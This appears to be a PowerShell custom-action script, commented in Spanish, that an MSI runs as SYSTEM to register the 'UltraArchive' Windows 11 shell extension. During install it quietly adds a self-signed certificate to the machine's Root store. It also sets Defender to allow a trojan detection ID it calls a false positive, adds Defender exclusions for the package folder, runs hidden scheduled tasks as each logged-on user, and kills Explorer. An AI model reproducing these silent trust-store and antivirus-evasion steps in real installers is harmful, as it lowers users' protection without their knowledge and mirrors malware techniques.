<#
  Lo ejecuta el MSI (custom action diferida, como SYSTEM) al INSTALAR.
  Registra la extension de shell del menu contextual moderno de Windows 11.

  Argumento 1: carpeta [INSTALLFOLDER]\shellext (contiene el .msix y el .cer).

  Idempotente y tolerante a fallos: si algo no esta disponible, escribe un aviso y termina con 0
  (la custom action va con Return="ignore"; el menu clasico HKLM sigue funcionando igualmente).
#>
param([Parameter(Mandatory)][string]$ShellExtDir)

$ErrorActionPreference = 'Continue'
$log = { param($m) Write-Output ("[UltraArchive shellext] " + $m) }

$msix = Join-Path $ShellExtDir 'UltraArchive.ShellExtension.msix'
$cer = Join-Path $ShellExtDir 'UltraArchive.ShellExtension.cer'
if (-not (Test-Path $msix)) { & $log ("no se encontro " + $msix + "; se omite el menu moderno."); exit 0 }

# 1. Confiar en el certificado de firma (autofirmado 'CN=UltraArchive').
if (Test-Path $cer) {
    foreach ($store in @('Root', 'TrustedPeople')) {
        & certutil.exe -addstore -f $store "$cer" | Out-Null
        & $log ("certificado anadido a LocalMachine\" + $store + " (exit " + $LASTEXITCODE + ")")
    }
}

# 2. Marcar como permitido el falso positivo AOT de Defender (Trojan:Win64/Aotera.*!MTB).
try {
    Add-MpPreference -ThreatIDDefaultAction_Ids 2147969239 -ThreatIDDefaultAction_Actions Allow -ErrorAction SilentlyContinue
    & $log "ThreatID AOT marcado como permitido en Defender"
} catch { & $log ("no se pudo marcar el ThreatID en Defender: " + $_.Exception.Message) }

# 3. Aprovisionar el paquete para todos los usuarios + excluir su carpeta de WindowsApps en Defender.
try {
    Add-AppxProvisionedPackage -Online -PackagePath $msix -SkipLicense -ErrorAction Stop | Out-Null
    & $log "paquete aprovisionado (Add-AppxProvisionedPackage)"
} catch {
    & $log ("Add-AppxProvisionedPackage fallo: " + $_.Exception.Message)
}
try {
    Get-ChildItem 'C:\Program Files\WindowsApps' -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -like 'UltraArchive.ShellExtension_*_x64__*' } |
        ForEach-Object {
            Add-MpPreference -ExclusionPath $_.FullName -ErrorAction SilentlyContinue
            & $log ("exclusion de Defender anadida: " + $_.FullName)
        }
} catch { & $log ("no se pudo excluir la carpeta de WindowsApps: " + $_.Exception.Message) }

# 4. Registro inmediato para los usuarios con sesion iniciada (sin esperar a cerrar sesion),
#    via tarea programada efimera en el contexto de cada usuario interactivo.
try {
    $manifestInApps = Get-ChildItem 'C:\Program Files\WindowsApps' -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -like 'UltraArchive.ShellExtension_*_x64__*' } |
        Sort-Object Name -Descending | Select-Object -First 1
    $explorerUsers = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $o = Invoke-CimMethod -InputObject $_ -MethodName GetOwner -ErrorAction SilentlyContinue
            if ($o) { $o.Domain + "\" + $o.User }
        } | Sort-Object -Unique
    if ($manifestInApps -and $explorerUsers) {
        $appxManifest = Join-Path $manifestInApps.FullName 'AppxManifest.xml'
        foreach ($u in $explorerUsers) {
            $taskName = "UltraArchiveShellExtRegister_" + [guid]::NewGuid().ToString('N')
            $arg = "-NoProfile -WindowStyle Hidden -Command ""Add-AppxPackage -Register '" + $appxManifest + "' -DisableDevelopmentMode"""
            $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arg
            $pri = New-ScheduledTaskPrincipal -UserId $u -LogonType Interactive
            Register-ScheduledTask -TaskName $taskName -Action $act -Principal $pri -ErrorAction Stop | Out-Null
            Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 3
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
            & $log ("registro inmediato lanzado para " + $u)
        }
    }
} catch { & $log ("registro inmediato no disponible (se aplicara al iniciar sesion): " + $_.Exception.Message) }

# 5. Reiniciar el Explorador para que cargue el manejador.
Get-Process -Name explorer -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

& $log "hecho."
exit 0
